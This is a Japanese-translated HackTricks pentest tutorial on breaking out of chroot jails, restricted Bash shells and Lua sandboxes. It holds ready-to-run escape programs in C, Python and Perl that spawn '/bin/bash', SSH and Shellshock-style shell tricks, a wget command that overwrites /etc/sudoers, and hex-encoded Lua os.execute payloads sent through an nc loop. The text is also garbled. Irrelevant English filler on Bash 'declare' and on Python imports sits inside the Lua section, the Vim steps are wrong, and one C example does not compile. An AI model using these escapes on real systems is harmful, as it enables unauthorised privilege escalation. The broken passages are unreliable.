# 制限された環境からの脱出

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## **GTFOBins**

**[https://gtfobins.github.io/](https://gtfobins.github.io)** **で "Shell" プロパティを持つバイナリを実行できるか検索します**

## Chrootの脱出

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)から：chrootメカニズムは、特権のある（root）ユーザーによる意図的な改ざんに対しては**防御することが意図されていません**。ほとんどのシステムでは、chrootコンテキストは正しくスタックされず、特権を持つchrootプログラムは**2番目のchrootを実行して脱出する**ことができます。\
通常、これは脱出するためにchroot内でrootである必要があることを意味します。

{% hint style="success" %}
**chw00t**という**ツール**は、次のエスケープシナリオを悪用して`chroot`から脱出するために作成されました。
{% endhint %}

### Root + CWD

{% hint style="warning" %}
chroot内で**root**である場合、**別のchroot**を作成して**脱出**することができます。これは、2つのchrootは同時に存在できないため（Linuxでは）、新しいフォルダを作成し、その新しいフォルダに対して**新しいchroot**を作成し、**それ以外の場所にいる**場合、**新しいchrootの外側**になります。

これは、通常、chrootは作業ディレクトリを指定した場所に移動しないため、chrootを作成できますが、その外側にいることができます。
{% endhint %}

通常、chrootのジェイル内には`chroot`バイナリはありませんが、バイナリを**コンパイルしてアップロードし、実行**することができます：

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python（パイソン）</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
<details>

<summary>Perl（パール）</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + 保存されたFD

{% hint style="warning" %}
これは前のケースと似ていますが、この場合、**攻撃者は現在のディレクトリへのファイルディスクリプタを保存**し、その後、**新しいフォルダにchrootを作成**します。最後に、彼はchrootの**外部**でその**FDにアクセス**できるため、彼は**脱出**します。
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
Unixドメインソケットを介してFDを渡すことができるため、次の手順を実行します：

* 子プロセスを作成します（fork）
* 親と子が通信できるようにUDSを作成します
* 子プロセスで別のフォルダにchrootを実行します
* 親プロセスで、新しい子プロセスのchrootの外にあるフォルダのFDを作成します
* UDSを使用してそのFDを子プロセスに渡します
* 子プロセスはそのFDにchdirし、chrootの外部にあるため、刑務所から脱出します
{% endhint %}

### &#x20;Root + Mount

{% hint style="warning" %}
* ルートデバイス（/）をchroot内のディレクトリにマウントします
* そのディレクトリにchrootします

これはLinuxで可能です
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* chroot内のディレクトリにprocfsをマウントします（まだマウントされていない場合）
* /proc/1/rootのように、異なるルート/カレントディレクトリエントリを持つpidを探します
* そのエントリにchrootします
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* フォーク（子プロセス）を作成し、FS内の別のフォルダにchrootし、それにCDします
* 親プロセスから、子プロセスがいるフォルダを、子プロセスのchrootの前のフォルダに移動します
* この子プロセスは、chrootの外にいることになります
{% endhint %}

### ptrace

{% hint style="warning" %}
* 以前は、ユーザーは自分自身のプロセスを自身のプロセスからデバッグできました...しかし、これはデフォルトではもう不可能です
* それでも、可能な場合は、プロセスにptraceしてその中でシェルコードを実行できます（[この例を参照してください](linux-capabilities.md#cap\_sys\_ptrace)）。
{% endhint %}

## Bash Jails

### 列挙

刑務所に関する情報を取得します：
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### PATHの変更

PATH環境変数を変更できるかどうかを確認します。
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vimを使用する

Vimを使用して、制限された環境からの脱出を試みることができます。以下の手順に従ってください。

1. Vimを起動します。

```bash
vim
```

2. Vimのコマンドモードに移動します。

```bash
:
```

3. Vimのコマンドモードで、以下のコマンドを入力します。

```bash
:set shell=/bin/sh
```

4. コマンドモードを終了し、Vimを再起動します。

```bash
:q!
```

5. Vimが再起動したら、以下のコマンドを入力してシェルを実行します。

```bash
:shell
```

これにより、制限された環境からシェルにアクセスすることができます。
```bash
:set shell=/bin/sh
:shell
```
### スクリプトの作成

_content_ として _/bin/bash_ を持つ実行可能ファイルを作成できるかどうかを確認します。
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSHからbashを取得する

SSH経由でアクセスしている場合、次のトリックを使用してbashシェルを実行できます：
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### 宣言する

In Bash, the `declare` command is used to declare variables and give them attributes. These attributes can be used to control the behavior and characteristics of the variables. The `declare` command can also be used to create and manipulate arrays.

```bash
declare [-aAfFgilnrtux] [-p] [name[=value] ...]
```

The options for the `declare` command are as follows:

- `-a`: Declare the variable as an indexed array.
- `-A`: Declare the variable as an associative array.
- `-f`: Declare the variable as a function.
- `-F`: Declare the variable as a function, but without defining its body.
- `-g`: Declare the variable as global.
- `-i`: Declare the variable as an integer.
- `-l`: Convert the value of the variable to lowercase.
- `-n`: Treat the variable as a reference to another variable.
- `-r`: Declare the variable as read-only.
- `-t`: Declare the variable as a trace variable.
- `-u`: Convert the value of the variable to uppercase.
- `-x`: Export the variable to the environment.

The `-p` option can be used to display the attributes and values of the variables.

Here are some examples of using the `declare` command:

```bash
declare -i num=10
declare -a arr=("apple" "banana" "cherry")
declare -r readonly_var="This variable is read-only"
declare -x exported_var="This variable is exported"
```

In the above examples, the `declare` command is used to declare a variable `num` as an integer, an array `arr`, a read-only variable `readonly_var`, and an exported variable `exported_var`.
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

sudoersファイルを上書きすることができます。
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### その他のトリック

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**次のページも興味深いかもしれません:**

{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
{% endcontent-ref %}

## Pythonのジェイル

次のページには、Pythonのジェイルからの脱出に関するトリックがあります:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Luaのジェイル

このページでは、Lua内でアクセスできるグローバル関数を見つけることができます: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**コマンドの実行を伴う評価:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
いくつかのトリックを使って、**ドットを使用せずにライブラリの関数を呼び出す方法**があります:

1. Using the `import` statement: You can import the library and then directly call the functions using the library name as a prefix. For example, if you want to call the `my_function()` function from the `my_library` library, you can do it like this:
```python
import my_library
my_library.my_function()
```

2. Using the `from` statement: You can import specific functions from the library and then call them directly without using the library name as a prefix. For example, if you want to call the `my_function()` function from the `my_library` library, you can do it like this:
```python
from my_library import my_function
my_function()
```

3. Using the `getattr()` function: You can use the `getattr()` function to dynamically retrieve and call functions from a library. This allows you to call functions without explicitly knowing their names. For example, if you have a variable `function_name` that contains the name of the function you want to call, you can do it like this:
```python
import my_library
function_name = "my_function"
getattr(my_library, function_name)()
```

These tricks can be useful in scenarios where you want to call library functions in a more flexible or dynamic way, without relying on the traditional dot notation.
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
列挙されたライブラリの関数：
```bash
for k,v in pairs(string) do print(k,v) end
```
注意してください。前述のワンライナーを**異なるLua環境で実行するたびに、関数の順序が変わります**。したがって、特定の関数を実行する必要がある場合は、異なるLua環境をロードし、leライブラリの最初の関数を呼び出すブルートフォース攻撃を実行することができます。
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**インタラクティブなLuaシェルを取得する**: 制限されたLuaシェル内にいる場合、次のコマンドを実行して新しいLuaシェル（そしておそらく制限のないシェル）を取得できます。

```bash
lua -e 'os.execute("/bin/sh")'
```

または

```bash
lua5.1 -e 'os.execute("/bin/sh")'
```

または

```bash
lua5.2 -e 'os.execute("/bin/sh")'
```

または

```bash
lua5.3 -e 'os.execute("/bin/sh")'
```

または

```bash
lua5.4 -e 'os.execute("/bin/sh")'
```

これにより、制限のないシェルにアクセスできるはずです。
```bash
debug.debug()
```
## 参考文献

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (スライド: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
